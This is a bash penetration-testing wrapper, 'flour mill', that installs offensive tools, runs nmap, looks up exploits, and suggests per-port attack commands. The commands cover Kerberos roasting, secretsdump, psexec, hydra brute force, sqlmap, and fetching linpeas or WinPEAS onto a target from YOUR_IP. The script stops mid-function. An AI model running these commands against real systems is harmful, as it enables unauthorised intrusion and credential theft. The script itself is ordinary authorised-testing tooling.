#!/bin/bash

# flour mill - automated recon wrapper
# scans stuff, checks vulns, runs the right tools
# usage: ./flour_mill.sh [target] or TARGET=ip ./flour_mill.sh

RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[1;33m'
BLU='\033[0;34m'
NC='\033[0m'

AVAIL=()
MISSING=()
TARGET=""
OUTDIR=""
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
start_time=$(date +%s)
SCAN_TYPE=""
os=""
VERSION="3.0"

# update check
if [[ "$1" == "--update" || "$1" == "-u" ]]; then
    echo -e "${YEL}[*] checking for updates...${NC}"
    
    script_dir=$(dirname $(readlink -f "$0"))
    
    if [[ -d "$script_dir/.git" ]]; then
        cd "$script_dir"
        git fetch origin >/dev/null 2>&1
        
        local_hash=$(git rev-parse HEAD)
        remote_hash=$(git rev-parse origin/main 2>/dev/null || git rev-parse origin/master 2>/dev/null)
        
        if [[ "$local_hash" == "$remote_hash" ]]; then
            echo -e "${GRN}[+] already up to date${NC}"
        else
            echo -e "${YEL}[*] updating...${NC}"
            git pull
            echo -e "${GRN}[+] updated${NC}"
        fi
    else
        echo -e "${RED}not a git repo, can't update${NC}"
        echo -e "${YEL}reinstall from github or use git clone${NC}"
    fi
    exit 0
fi

# version
if [[ "$1" == "--version" || "$1" == "-v" ]]; then
    echo "flour_mill v${VERSION}"
    exit 0
fi

# check if target passed as arg
if [[ -n "$1" && "$1" != -* ]]; then
    TARGET="$1"
fi

banner() {
    echo -e "${BLU}"
    cat << "EOF"
    || __   ||
    ||=\_`\=||
    || (__/ ||
    ||  | | :-"""-.
    ||==| \/-=-.   \
    ||  |(_|o o/   |_
    ||   \/ "  \   ,_)
    ||====\ ^  /__/
    ||     ;--'  `-.
    ||    /      .  \
    ||===;        \  \
    ||   |         | |
    || .-\ '     _/_/
    |:'  _;.    (_  \
    /  .'  `;\   \\_/
   |_ /     |||  |\\
  /  _)=====|||  | ||
 /  /|      ||/  / //
 \_/||      ( `-/ ||
    ||======/  /  \\ .-.
    ||      \_/    \'-'/
    ||      ||      `"`
    ||======||
    ||      ||

                        ╔═══════════════════════════════╗
                        ║     Flour Mill v3.0           ║
                        ║   scan → parse → exploit      ║
                        ╚═══════════════════════════════╝
EOF
    echo -e "${NC}\n"
}

check_deps() {
    echo -e "${YEL}[*] checking tools...${NC}\n"
    
    # stuff we might want
    tools=(
        "nmap:network scanning"
        "kerbrute:kerberos enum"
        "impacket-GetNPUsers:asreproast"
        "impacket-GetUserSPNs:kerberoast"
        "impacket-secretsdump:dump secrets"
        "impacket-psexec:remote exec"
        "impacket-smbexec:smb exec"
        "impacket-wmiexec:wmi exec"
        "impacket-mssqlclient:mssql client"
        "enum4linux-ng:smb enum"
        "smbclient:smb client"
        "smbmap:smb shares"
        "netexec:protocol testing"
        "responder:hash capture"
        "hydra:bruteforce"
        "medusa:bruteforce"
        "nikto:web scanner"
        "gobuster:dir bruteforce"
        "dirb:web enum"
        "ffuf:web fuzzer"
        "dirsearch:web scanner"
        "nuclei:vuln scanner"
        "whatweb:web fingerprint"
        "eyewitness:web screenshots"
        "dnsx:dns toolkit"
        "sqlmap:sqli"
        "ssh-audit:ssh check"
        "msfconsole:metasploit"
        "searchsploit:exploit db"
        "ldapsearch:ldap"
        "dig:dns"
        "dnsenum:dns enum"
    )
    
    for t in "${tools[@]}"; do
        tool=$(echo "$t" | cut -d: -f1)
        desc=$(echo "$t" | cut -d: -f2)
        
        if command -v "$tool" &>/dev/null; then
            AVAIL+=("$tool")
            echo -e "${GRN}[+]${NC} $tool"
        else
            MISSING+=("$tool")
            echo -e "${RED}[-]${NC} $tool"
        fi
    done
    
    echo -e "\n${GRN}got: ${#AVAIL[@]}${NC} | ${RED}missing: ${#MISSING[@]}${NC}\n"
    
    # nmap is required, everything else is optional
    [[ ! $(command -v nmap) ]] && { echo -e "${RED}need nmap${NC}"; exit 1; }
    
    check_wordlists
    
    # offer to install missing stuff
    if [ ${#MISSING[@]} -gt 0 ]; then
        echo -e "${YEL}missing ${#MISSING[@]} tools${NC}"
        read -p "install? (y/n): " inst
        
        [[ "$inst" =~ ^[Yy]$ ]] && install_missing
        echo ""
    fi
}

check_wordlists() {
    echo -e "${YEL}[*] checking wordlists...${NC}\n"
    
    wordlists=(
        "/usr/share/wordlists/dirb/common.txt:dirb common"
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:dirbuster medium"
        "/usr/share/wordlists/rockyou.txt:rockyou"
        "/usr/share/seclists:seclists"
    )
    
    missing_wl=()
    
    for wl in "${wordlists[@]}"; do
        path=$(echo "$wl" | cut -d: -f1)
        name=$(echo "$wl" | cut -d: -f2)
        
        if [ -e "$path" ]; then
            echo -e "${GRN}[+]${NC} $name"
        else
            echo -e "${RED}[-]${NC} $name"
            missing_wl+=("$name")
        fi
    done
    
    echo ""
    
    if [ ${#missing_wl[@]} -gt 0 ]; then
        echo -e "${YEL}missing ${#missing_wl[@]} wordlists${NC}"
        read -p "install wordlists? (y/n): " inst_wl
        
        if [[ "$inst_wl" =~ ^[Yy]$ ]]; then
            install_wordlists
        fi
        echo ""
    fi
}

install_wordlists() {
    echo -e "${YEL}[*] installing wordlists...${NC}\n"
    
    # dirb common
    if [ ! -f "/usr/share/wordlists/dirb/common.txt" ]; then
        echo -e "${BLU}[*] dirb wordlists...${NC}"
        sudo apt install -y dirb 2>/dev/null
        [ -f "/usr/share/wordlists/dirb/common.txt" ] && echo -e "${GRN}[+] installed${NC}" || echo -e "${RED}[-] failed${NC}"
    fi
    
    # dirbuster
    if [ ! -f "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ]; then
        echo -e "${BLU}[*] dirbuster wordlists...${NC}"
        sudo apt install -y dirbuster 2>/dev/null
        [ -f "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ] && echo -e "${GRN}[+] installed${NC}" || echo -e "${RED}[-] failed${NC}"
    fi
    
    # rockyou
    if [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
        echo -e "${BLU}[*] rockyou...${NC}"
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
            [ -f "/usr/share/wordlists/rockyou.txt" ] && echo -e "${GRN}[+] extracted${NC}" || echo -e "${RED}[-] failed${NC}"
        else
            sudo apt install -y wordlists 2>/dev/null
            [ -f "/usr/share/wordlists/rockyou.txt.gz" ] && sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
            [ -f "/usr/share/wordlists/rockyou.txt" ] && echo -e "${GRN}[+] installed${NC}" || echo -e "${RED}[-] failed${NC}"
        fi
    fi
    
    # seclists
    if [ ! -d "/usr/share/seclists" ]; then
        echo -e "${BLU}[*] seclists...${NC}"
        sudo apt install -y seclists 2>/dev/null || {
            # apt failed, try github
            sudo git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
        }
        [ -d "/usr/share/seclists" ] && echo -e "${GRN}[+] installed${NC}" || echo -e "${RED}[-] failed${NC}"
    fi
    
    echo -e "\n${GRN}wordlists setup done${NC}\n"
}

install_missing() {
    echo -e "${YEL}[*] installing...${NC}\n"
    
    # see if we need pipx for anything
    need_pipx=false
    for t in "${MISSING[@]}"; do
        case $t in
            netexec|impacket-*|enum4linux-ng) need_pipx=true ;;
        esac
    done
    
    if $need_pipx && ! command -v pipx &>/dev/null; then
        echo -e "${YEL}[*] getting pipx...${NC}"
        sudo apt update && sudo apt install -y pipx
        pipx ensurepath
    fi
    
    # see if we need go
    need_go=false
    for t in "${MISSING[@]}"; do
        [[ "$t" == "ffuf" || "$t" == "nuclei" || "$t" == "dnsx" ]] && need_go=true
    done
    
    if $need_go && ! command -v go &>/dev/null; then
        echo -e "${YEL}go not found, needed for ffuf/nuclei/dnsx${NC}"
        read -p "install go? (y/n): " inst_go
        if [[ "$inst_go" =~ ^[Yy]$ ]]; then
            echo -e "${YEL}[*] installing go...${NC}"
            sudo apt update && sudo apt install -y golang-go
        fi
    fi
    
    # install each missing tool
    for t in "${MISSING[@]}"; do
        echo -e "${BLU}[*] $t...${NC}"
        
        case $t in
            netexec)
                pipx install git+https://github.com/Pennyw0rth/NetExec 2>/dev/null
                ;;
            impacket-*)
                # all impacket tools come from one package
                if ! pipx list | grep -q "impacket"; then
                    echo -e "${YEL}[*] installing impacket suite...${NC}"
                    pipx install impacket 2>/dev/null
                    
                    # make sure path is updated
                    pipx ensurepath
                    
                    # verify it worked
                    if command -v impacket-secretsdump &>/dev/null; then
                        echo -e "${GRN}[+] impacket installed${NC}"
                    else
                        echo -e "${YEL}[!] impacket installed but not in PATH${NC}"
                        echo -e "${YEL}    run: source ~/.bashrc${NC}"
                        echo -e "${YEL}    or restart your terminal${NC}"
                    fi
                fi
                ;;
            enum4linux-ng)
                pipx install git+https://github.com/cddmp/enum4linux-ng 2>/dev/null
                ;;
            kerbrute)
                wget -q https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /tmp/kerbrute
                chmod +x /tmp/kerbrute
                sudo mv /tmp/kerbrute /usr/local/bin/kerbrute 2>/dev/null
                ;;
            ffuf)
                if command -v go &>/dev/null; then
                    go install github.com/ffuf/ffuf@latest 2>/dev/null
                    [[ -f ~/go/bin/ffuf ]] && sudo cp ~/go/bin/ffuf /usr/local/bin/ 2>/dev/null
                else
                    sudo apt install -y ffuf 2>/dev/null
                fi
                ;;
            nuclei)
                if command -v go &>/dev/null; then
                    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null
                    [[ -f ~/go/bin/nuclei ]] && sudo cp ~/go/bin/nuclei /usr/local/bin/ 2>/dev/null
                else
                    sudo apt install -y nuclei 2>/dev/null
                fi
                ;;
            dnsx)
                if command -v go &>/dev/null; then
                    go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest 2>/dev/null
                    [[ -f ~/go/bin/dnsx ]] && sudo cp ~/go/bin/dnsx /usr/local/bin/ 2>/dev/null
                else
                    sudo apt install -y dnsx 2>/dev/null
                fi
                ;;
            eyewitness)
                # eyewitness needs some setup
                sudo apt install -y eyewitness 2>/dev/null || {
                    git clone https://github.com/FortyNorthSecurity/EyeWitness.git /tmp/eyewitness 2>/dev/null
                    cd /tmp/eyewitness/Python/setup
                    sudo ./setup.sh 2>/dev/null
                    sudo ln -s /tmp/eyewitness/Python/EyeWitness.py /usr/local/bin/eyewitness 2>/dev/null
                }
                ;;
            whatweb)
                sudo apt install -y whatweb 2>/dev/null
                ;;
            smbmap)
                sudo apt install -y smbmap 2>/dev/null
                ;;
            searchsploit)
                sudo apt install -y exploitdb 2>/dev/null
                ;;
            responder)
                sudo apt install -y responder 2>/dev/null
                ;;
            dirsearch)
                sudo apt install -y dirsearch 2>/dev/null || {
                    git clone https://github.com/maurosoria/dirsearch.git /tmp/dirsearch 2>/dev/null
                    sudo cp /tmp/dirsearch/dirsearch.py /usr/local/bin/dirsearch 2>/dev/null
                    sudo chmod +x /usr/local/bin/dirsearch 2>/dev/null
                    rm -rf /tmp/dirsearch
                }
                ;;
            *)
                sudo apt install -y $t 2>/dev/null
                ;;
        esac
        
        if command -v "$t" &>/dev/null; then
            echo -e "${GRN}[+] installed${NC}"
            AVAIL+=("$t")
        else
            echo -e "${RED}[-] failed${NC}"
        fi
    done
    
    # rebuild missing list
    MISSING=()
    for t in "${tools[@]}"; do
        tool=$(echo "$t" | cut -d: -f1)
        command -v "$tool" &>/dev/null || MISSING+=("$tool")
    done
    
    echo -e "\n${GRN}done: ${#AVAIL[@]} available${NC}"
    [ ${#MISSING[@]} -gt 0 ] && echo -e "${RED}still missing: ${#MISSING[@]}${NC}\n"
}

has_tool() {
    for t in "${AVAIL[@]}"; do
        [[ "$t" == "$1" ]] && return 0
    done
    return 1
}

get_target() {
    # use TARGET if already set
    if [[ -n "$TARGET" ]]; then
        echo -e "${GRN}[+] using exported target: $TARGET${NC}"
    else
        read -p "target: " TARGET
        [[ -z "$TARGET" ]] && { echo -e "${RED}need target${NC}"; exit 1; }
    fi
    
    echo -e "${YEL}[*] checking...${NC}"
    
    # ping and guess OS from TTL
    kernel=$(uname -s)
    [ $kernel = "Linux" ] && tw="W" || tw="t"
    
    ping_out=$(ping -c 1 -${tw} 1 "$TARGET" 2>/dev/null | grep ttl)
    
    if [[ -n "$ping_out" ]]; then
        echo -e "${GRN}[+] up${NC}"
        
        ttl=$(echo "$ping_out" | grep -oP 'ttl=\K[0-9]+')
        
        # guess OS based on TTL (not perfect but usually right)
        if [[ $ttl -ge 250 && $ttl -le 256 ]]; then
            os="bsd/cisco"
        elif [[ $ttl -ge 120 && $ttl -le 130 ]]; then
            os="windows"
        elif [[ $ttl -ge 60 && $ttl -le 70 ]]; then
            os="linux"
        else
            os="unknown"
        fi
        
        echo -e "${GRN}[+] probably $os (ttl=$ttl)${NC}"
    else
        echo -e "${YEL}no ping (filtered?)${NC}"
    fi
    
    echo ""
}

setup_scan() {
    echo -e "${YEL}scan type:${NC}"
    echo "1) quick"
    echo "2) standard"
    echo "3) full"
    echo "4) stealth"
    echo "5) quick stealth"
    echo "6) quick aggressive"
    echo "7) udp"
    echo "8) udp full"
    echo "9) custom"
    read -p "> " c
    
    case $c in
        1) flags="-sS -F"; SCAN_TYPE="quick" ;;
        2) flags="-sS -sV -sC -p-"; SCAN_TYPE="standard" ;;
        3) flags="-A -p- -T4"; SCAN_TYPE="full" ;;
        4) flags="-sS -f -T2"; SCAN_TYPE="stealth" ;;
        5) flags="-sS -sV -F -T2 -Pn"; SCAN_TYPE="quick-stealth" ;;
        6) flags="-sS -sV -sC -F -T4 --min-rate=1000"; SCAN_TYPE="quick-aggressive" ;;
        7) flags="-sU -F"; SCAN_TYPE="udp" ;;
        8) flags="-sU -p-"; SCAN_TYPE="udp-full" ;;
        9) read -p "flags: " flags; SCAN_TYPE="custom" ;;
        *) flags="-sS -sV -sC -p-"; SCAN_TYPE="standard" ;;
    esac
    
    echo -e "\n${YEL}verbosity:${NC}"
    echo "1) normal"
    echo "2) -v"
    echo "3) -vv"
    read -p "> " v
    
    verb=""
    [[ $v == 2 ]] && verb="-v"
    [[ $v == 3 ]] && verb="-vv"
    
    # output location
    echo -e "\n${YEL}save to:${NC}"
    echo "1) ~/Documents/scans"
    echo "2) ./scans"
    echo "3) custom"
    read -p "> " d
    
    case $d in
        1) base="$HOME/Documents/scans" ;;
        2) base="./scans" ;;
        3) 
            read -p "path: " base
            [[ -z "$base" ]] && base="./scans"
            ;;
        *) base="$HOME/Documents/scans" ;;
    esac
    
    # optional scan name
    echo -e "\n${YEL}scan name (optional):${NC}"
    read -p "name (or enter for default): " scan_name
    
    if [[ -n "$scan_name" ]]; then
        OUTDIR="${base}/${scan_name}_${TARGET}_${TIMESTAMP}"
    else
        OUTDIR="${base}/${TARGET}_${TIMESTAMP}"
    fi
    
    # create autorecon-style directory structure
    mkdir -p "$OUTDIR"/{scans,exploit,loot,report,screenshots}
    
    echo -e "\n${GRN}[+] setup done${NC}"
    echo -e "    $flags $verb"
    echo -e "    $OUTDIR\n"
}

run_scan() {
    echo -e "${YEL}[*] scanning...${NC}\n"
    
    nmapout="$OUTDIR/scans/nmap.txt"
    nmapxml="$OUTDIR/scans/nmap.xml"
    nmapgrep="$OUTDIR/scans/nmap.gnmap"
    
    cmd="sudo nmap $flags $verb -oN $nmapout -oX $nmapxml -oG $nmapgrep $TARGET"
    
    echo -e "${BLU}[*] starting scan...${NC}"
    echo -e "${BLU}    $cmd${NC}"
    echo -e "${BLU}    might take a bit...${NC}\n"
    
    if eval "$cmd"; then
        echo -e "\n${GRN}[+] scan done${NC}\n"
    else
        echo -e "\n${RED}[!] failed${NC}"
        exit 1
    fi
}

parse_results() {
    echo -e "${YEL}[*] parsing...${NC}\n"
    
    [[ ! -f "$nmapout" ]] && { echo -e "${RED}no output${NC}"; exit 1; }
    
    # grab just the open ports
    grep -E "^[0-9]+/(tcp|udp).*open" "$nmapout" > "$OUTDIR/scans/ports.txt" || true
    
    if [[ ! -s "$OUTDIR/scans/ports.txt" ]]; then
        echo -e "${RED}no open ports${NC}"
        exit 0
    fi
    
    echo -e "${GRN}open:${NC}\n"
    cat "$OUTDIR/scans/ports.txt"
    echo ""
}

check_vulns() {
    local svc=$1
    local ver=$2
    
    echo -e "\n${BLU}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLU}║${NC}${YEL}              VULNERABILITY CHECK                       ${NC}${BLU}║${NC}"
    echo -e "${BLU}╚════════════════════════════════════════════════════════╝${NC}"
    
    search=$(echo "$svc $ver" | sed 's/[^a-zA-Z0-9. ]//g')
    
    # make sure we have internet
    ping -c 1 8.8.8.8 &>/dev/null || { echo -e "${RED}no net${NC}"; return; }
    command -v curl &>/dev/null || { echo -e "${RED}need curl${NC}"; return; }
    
    found_vulns=false
    
    # check NVD
    echo -e "\n${YEL}[*] searching NVD for: $search${NC}"
    cves=$(curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${search// /%20}" 2>/dev/null)
    
    if echo "$cves" | grep -q "CVE-"; then
        found_vulns=true
        echo -e "\n${RED}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║        CVEs FOUND - POTENTIAL VULNERABILITIES          ║${NC}"
        echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}\n"
        echo "$cves" | grep -oP 'CVE-[0-9]{4}-[0-9]+' | head -5 | while read c; do
            echo -e "${RED}  ▶ $c${NC}"
            echo -e "    https://nvd.nist.gov/vuln/detail/$c"
            echo "[$svc:$ver] $c" >> "$OUTDIR/report/vulns.txt"
        done
    else
        echo -e "${GRN}  ✓ no known CVEs${NC}"
    fi
    
    # check Vulners API
    echo -e "\n${YEL}[*] searching Vulners API...${NC}"
    vulners=$(curl -s "https://vulners.com/api/v3/search/lucene/?query=${search// /%20}" 2>/dev/null)
    
    if echo "$vulners" | grep -q '"id"'; then
        found_vulns=true
        echo -e "\n${YEL}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YEL}║            VULNERS DATABASE RESULTS                    ║${NC}"
        echo -e "${YEL}╚════════════════════════════════════════════════════════╝${NC}\n"
        echo "$vulners" | grep -oP '"id":"\K[^"]+' | head -5 | while read v; do
            echo -e "${YEL}  ▶ $v${NC}"
            echo "[$svc:$ver] vulners: $v" >> "$OUTDIR/report/vulns.txt"
        done
    else
        echo -e "${GRN}  ✓ no Vulners results${NC}"
    fi
    
    # check github for exploits
    echo -e "\n${YEL}[*] searching GitHub for exploits...${NC}"
    gh="${search// /+}+exploit"
    repos=$(curl -s "https://api.github.com/search/repositories?q=${gh}&sort=stars&order=desc" 2>/dev/null)
    
    if echo "$repos" | grep -q '"full_name"'; then
        found_vulns=true
        echo -e "\n${YEL}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YEL}║            EXPLOITS AVAILABLE ON GITHUB                ║${NC}"
        echo -e "${YEL}╚════════════════════════════════════════════════════════╝${NC}\n"
        echo "$repos" | grep -oP '"full_name":\s*"\K[^"]+' | head -3 | while read r; do
            echo -e "${YEL}  ▶ https://github.com/$r${NC}"
            echo "[$svc:$ver] github.com/$r" >> "$OUTDIR/report/vulns.txt"
        done
    else
        echo -e "${GRN}  ✓ no public exploits found${NC}"
    fi
    
    # check metasploit modules
    if command -v msfconsole &>/dev/null; then
        echo -e "\n${YEL}[*] searching Metasploit modules...${NC}"
        msf=$(msfconsole -q -x "search ${svc}; exit" 2>/dev/null | grep -E "exploit|auxiliary")
        
        if [[ -n "$msf" ]]; then
            found_vulns=true
            echo -e "\n${RED}╔════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║           METASPLOIT MODULES AVAILABLE                 ║${NC}"
            echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}\n"
            echo "$msf" | head -5
            echo "$msf" | head -5 >> "$OUTDIR/report/vulns.txt"
        else
            echo -e "${GRN}  ✓ no MSF modules found${NC}"
        fi
    fi
    
    # check exploit-db if available
    if command -v searchsploit &>/dev/null; then
        echo -e "\n${YEL}[*] searching Exploit-DB...${NC}"
        ex=$(searchsploit "$search" 2>/dev/null | grep -v "Exploits: No Results")
        
        if [[ -n "$ex" ]]; then
            found_vulns=true
            echo -e "\n${RED}╔════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║             EXPLOITS IN EXPLOIT-DB                     ║${NC}"
            echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}\n"
            echo "$ex" | head -5
            echo "$ex" | head -5 >> "$OUTDIR/report/vulns.txt"
        else
            echo -e "${GRN}  ✓ no exploits in database${NC}"
        fi
    fi
    
    # show summary
    if $found_vulns; then
        echo -e "\n${RED}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║                                                        ║${NC}"
        echo -e "${RED}║                    ACTION REQUIRED                     ║${NC}"
        echo -e "${RED}║          Vulnerabilities detected for $svc $ver        ║${NC}"
        echo -e "${RED}║              Check report/vulns.txt for details        ║${NC}"
        echo -e "${RED}║               Review suggested exploits above          ║${NC}"
        echo -e "${RED}║                                                        ║${NC}"
        echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}"
    else
        echo -e "\n${GRN}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GRN}║           No obvious vulnerabilities found             ║${NC}"
        echo -e "${GRN}╚════════════════════════════════════════════════════════╝${NC}"
    fi
    
    echo ""
}

get_tools() {
    p=$1
    svc=$2
    
    # figure out which tools to suggest based on port/service
    case $p in
        88|464)
            [[ "$svc" =~ kerberos ]] && {
                echo "kerbrute|enum users|kerbrute userenum -d DOMAIN --dc $TARGET users.txt"
                echo "impacket-GetNPUsers|asreproast|GetNPUsers.py DOMAIN/ -dc-ip $TARGET -usersfile users.txt"
                echo "impacket-GetUserSPNs|kerberoast|GetUserSPNs.py DOMAIN/user:pass -dc-ip $TARGET"
            }
            ;;
        139|445)
            [[ "$svc" =~ netbios|microsoft-ds|smb ]] && {
                echo "enum4linux-ng|smb enum|enum4linux-ng -A $TARGET"
                echo "smbclient|shares|smbclient -L //$TARGET -N"
                echo "smbmap|share enum|smbmap -H $TARGET"
                echo "netexec|smb test|netexec smb $TARGET -u '' -p ''"
                echo "impacket-secretsdump|dump secrets|impacket-secretsdump DOMAIN/user:pass@$TARGET"
                echo "impacket-psexec|remote exec|impacket-psexec DOMAIN/user:pass@$TARGET"
                echo "impacket-smbexec|smb exec|impacket-smbexec DOMAIN/user:pass@$TARGET"
                echo "impacket-wmiexec|wmi exec|impacket-wmiexec DOMAIN/user:pass@$TARGET"
            }
            ;;
        3389)
            [[ "$svc" =~ ms-wbt-server|rdp ]] && {
                echo "hydra|rdp brute|hydra -L users.txt -P pass.txt rdp://$TARGET"
            }
            ;;
        22)
            [[ "$svc" =~ ssh ]] && {
                echo "ssh-audit|check config|ssh-audit $TARGET"
                echo "hydra|ssh brute|hydra -L users.txt -P pass.txt ssh://$TARGET"
            }
            ;;
        21)
            [[ "$svc" =~ ftp ]] && {
                echo "hydra|ftp brute|hydra -L users.txt -P pass.txt ftp://$TARGET"
            }
            ;;
        80|443|8080|8443)
            [[ "$svc" =~ http|https|ssl ]] && {
                echo "whatweb|fingerprint|whatweb http://$TARGET:$p"
                echo "eyewitness|screenshot|eyewitness --web --single http://$TARGET:$p --no-prompt -d $OUTDIR/screenshots/"
                echo "nikto|web scan|nikto -h $TARGET:$p"
                echo "gobuster|dirs|gobuster dir -u http://$TARGET:$p -w /usr/share/wordlists/dirb/common.txt"
                echo "ffuf|fuzzing|ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET:$p/FUZZ"
                echo "dirsearch|web scan|dirsearch -u http://$TARGET:$p"
                echo "nuclei|vuln scan|nuclei -u http://$TARGET:$p -t ~/nuclei-templates/"
                echo "sqlmap|sqli|sqlmap -u http://$TARGET:$p --batch --crawl=1"
            }
            ;;
        389|636|3268|3269)
            [[ "$svc" =~ ldap ]] && {
                echo "ldapsearch|ldap enum|ldapsearch -x -h $TARGET -b 'dc=domain,dc=com'"
            }
            ;;
        1433)
            [[ "$svc" =~ ms-sql|mssql ]] && {
                echo "impacket-mssqlclient|mssql client|impacket-mssqlclient DOMAIN/user:pass@$TARGET -windows-auth"
                echo "netexec|mssql check|netexec mssql $TARGET -u user -p pass"
            }
            ;;
        53)
            [[ "$svc" =~ domain|dns ]] && {
                echo "dig|dns query|dig @$TARGET ANY domain.com"
                echo "dnsx|dns toolkit|dnsx -l subdomains.txt -d domain.com"
                echo "dnsenum|dns enum|dnsenum --dnsserver $TARGET domain.com"
            }
            ;;
        *)
            echo "msfconsole|search|msfconsole -q -x 'search $svc; exit'"
            ;;
    esac
}

# show next steps / privesc hints based on service
show_next_steps() {
    p=$1
    svc=$2
    
    echo -e "\n${BLU}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLU}║${NC}${YEL}                   NEXT STEPS                          ${NC}${BLU}║${NC}"
    echo -e "${BLU}╚════════════════════════════════════════════════════════╝${NC}"
    
    case $p in
        139|445)
            if [[ "$svc" =~ netbios|microsoft-ds|smb ]]; then
                echo -e "\n${YEL}If you get creds or a shell:${NC}"
                echo "  1. List shares: smbmap -H $TARGET -u user -p pass"
                echo "  2. Check for vulns: searchsploit $svc" 
                
                if [[ "$os" == "windows" ]]; then
                    echo -e "\n${YEL}Windows box - privesc steps:${NC}"
                    # only suggest if we have the tool
                    if command -v wget &>/dev/null; then
                        echo "  1. Get WinPEAS on target:"
                        echo "     wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
                        echo "  2. Transfer it: impacket-smbserver share . -smb2support"
                        echo "  3. On target: copy \\\\YOUR_IP\\share\\winPEASx64.exe ."
                        echo "  4. Run: .\\winPEASx64.exe"
                    fi
                    echo -e "\n${YEL}Look for:${NC}"
                    echo "  → Unquoted service paths"
                    echo "  → Weak file permissions"
                    echo "  → AlwaysInstallElevated"
                    echo "  → Saved credentials"
                fi
            fi
            ;;
        22)
            if [[ "$svc" =~ ssh ]]; then
                echo -e "\n${YEL}Once you have SSH access:${NC}"
                
                if [[ "$os" == "linux" ]] || [[ -z "$os" ]]; then
                    echo "  1. Start web server locally: python3 -m http.server 8000"
                    # check if we can suggest linpeas
                    if command -v wget &>/dev/null || command -v curl &>/dev/null; then
                        echo "  2. On target: wget http://YOUR_IP:8000/linpeas.sh"
                        echo "  3. Run: chmod +x linpeas.sh && ./linpeas.sh"
                    fi
                    
                    echo -e "\n${YEL}Quick manual checks:${NC}"
                    echo "  sudo -l"
                    echo "  find / -perm -4000 2>/dev/null"
                    echo "  cat /etc/crontab"
                    echo "  ls -la /home"
                    
                    echo -e "\n${YEL}Look for:${NC}"
                    echo "  → SUID binaries (check GTFOBins)"
                    echo "  → Sudo misconfigurations"
                    echo "  → Writable cron jobs"
                    echo "  → Passwords in history/config files"
                fi
            fi
            ;;
        80|443|8080|8443)
            if [[ "$svc" =~ http|https ]]; then
                echo -e "\n${YEL}Found a web app - common next steps:${NC}"
                echo "  1. Check for known CMS/framework vulns"
                echo "  2. Look for: /admin, /login, /.git, /backup"
                echo "  3. Try default creds if you find a login"
                
                if has_tool "searchsploit"; then
                    echo "  4. Search exploits: searchsploit [cms name]"
                fi
                
                echo -e "\n${YEL}If you get RCE or file upload:${NC}"
                echo "  → Get a reverse shell"
                echo "  → Then run privesc enumeration (see above)"
            fi
            ;;
        3389)
            if [[ "$svc" =~ rdp ]]; then
                echo -e "\n${YEL}RDP is open:${NC}"
                echo "  1. Try known default creds first"
                echo "  2. Use hydra if you have a user list"
                echo "  3. Check for BlueKeep (CVE-2019-0708) if old Windows"
                
                if has_tool "searchsploit"; then
                    echo "  4. Search: searchsploit rdp"
                fi
            fi
            ;;
        1433)
            if [[ "$svc" =~ mssql ]]; then
                echo -e "\n${YEL}MSSQL found:${NC}"
                echo "  1. Try default sa account"
                echo "  2. If you get in: xp_cmdshell for RCE"
                echo "  3. Then WinPEAS for privesc (see SMB section above)"
            fi
            ;;
    esac
    
    echo ""
}

run_tools() {
    while read line; do
        p=$(echo "$line" | awk '{print $1}' | cut -d'/' -f1)
        svc=$(echo "$line" | awk '{print $3}')
        ver=$(echo "$line" | awk '{for(i=4;i<=NF;i++) printf "%s ", $i}' | xargs)
        
        echo -e "${BLU}========================================${NC}"
        echo -e "${YEL}port $p - $svc${NC}"
        [[ -n "$ver" ]] && echo -e "${YEL}version: $ver${NC}"
        echo -e "${BLU}========================================${NC}"
        
        # ask about vuln check
        if [[ -n "$ver" ]]; then
            read -p "check vulns? (y/n): " vc
            [[ "$vc" =~ ^[Yy]$ ]] && check_vulns "$svc" "$ver"
        fi
        
        sugg=$(get_tools "$p" "$svc")
        
        [[ -z "$sugg" ]] && { echo -e "${YEL}nothing for this${NC}\n"; continue; }
        
        # go through each suggested tool
        while IFS='|' read -r tool desc ex; do
            [[ -z "$tool" ]] && continue
            
            echo -e "\n${GRN}tool:${NC} $tool"
            echo -e "${GRN}desc:${NC} $desc"
            echo -e "${GRN}cmd:${NC} $ex"
            
            if ! has_tool "$tool"; then
                echo -e "${RED}[-] not installed${NC}"
                continue
            fi
            
            echo -e "${GRN}[+] available${NC}"
            read -p "run? (y/n): " r
            
            if [[ "$r" =~ ^[Yy]$ ]]; then
                read -p "custom cmd (or enter): " uc
                [[ -z "$uc" ]] && uc="$ex"
                
                echo -e "\n${BLU}[*] running $tool...${NC}"
                echo -e "${BLU}    $uc${NC}\n"
                
                log="$OUTDIR/scans/${tool}_p${p}_${TIMESTAMP}.txt"
                
                # log command with timestamp so you can see what ran and when
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] $uc" >> "$OUTDIR/scans/commands.log"
                
